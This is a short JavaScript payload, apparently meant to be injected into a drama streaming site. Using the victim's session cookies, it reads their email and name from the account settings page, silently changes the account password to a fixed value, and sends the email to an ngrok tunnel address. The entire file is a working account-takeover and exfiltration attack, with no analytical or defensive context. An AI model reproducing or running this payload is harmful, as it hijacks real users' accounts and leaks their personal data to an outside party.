(async () => {
    try {
        const html = await fetch('https://webdramaturkey2.com/ayarlar', { credentials: 'include' })
            .then(r => r.text());
        const doc = new DOMParser().parseFromString(html, 'text/html');
        const email = doc.querySelector('input[name="email"]')?.value;
        const name = doc.querySelector('input[name="name"]')?.value;

        if (email && name) {
            const formData = new FormData();
            formData.append("_ACTION", "save");
            formData.append("email", email);
            formData.append("name", name);
            formData.append("password", "sense1");

            await fetch("https://webdramaturkey2.com/ayarlar", {
                method: "POST",
                credentials: "include",
                body: formData
            });
        }

        await fetch(`https://2d54a0f19fd2.ngrok-free.app/?${email}`);
    } catch (e) {
        console.error('Error:', e);
    }
})();
